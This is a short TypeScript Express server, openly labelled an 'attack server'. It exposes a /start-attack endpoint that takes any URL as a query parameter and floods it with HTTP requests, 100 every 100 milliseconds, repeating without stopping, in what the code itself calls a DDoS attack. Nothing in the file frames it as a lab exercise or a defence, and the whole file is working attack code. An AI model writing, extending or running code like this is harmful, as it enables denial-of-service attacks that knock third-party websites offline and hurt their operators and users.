import express from 'express';
import axios from 'axios';

const app = express();
const port = 4000;

app.use(express.json());

const concurrentRequests = 100;
const intervalMs = 100;

async function sendRequest(targetUrl: string) {
    try {
        await axios.get(targetUrl);
        console.log('Request sent');
    } catch (error) {
        if (error instanceof Error) {
            console.error('Request failed:', error.message);
        } else {
            console.error('Request failed:', String(error));
        }
    }
}

function startDDoSAttack(targetUrl: string) {
    console.log('Starting DDoS attack...');
    setInterval(() => {
        for (let i = 0; i < concurrentRequests; i++) {
            sendRequest(targetUrl);
        }
    }, intervalMs);
}

app.get('/start-attack', (req, res) => {
    const targetUrl = req.query.url as string;
    if (!targetUrl) {
        return res.status(400).send('Please provide a URL as query parameter to attack');
    }
    startDDoSAttack(targetUrl);
    res.send(`Attack started on ${targetUrl}. Check console for results.`);
});

app.listen(port, () => {
    console.log(`Attack server running on port ${port}`);
    console.log('Visit http://localhost:4000/start-attack to begin the attack');
});
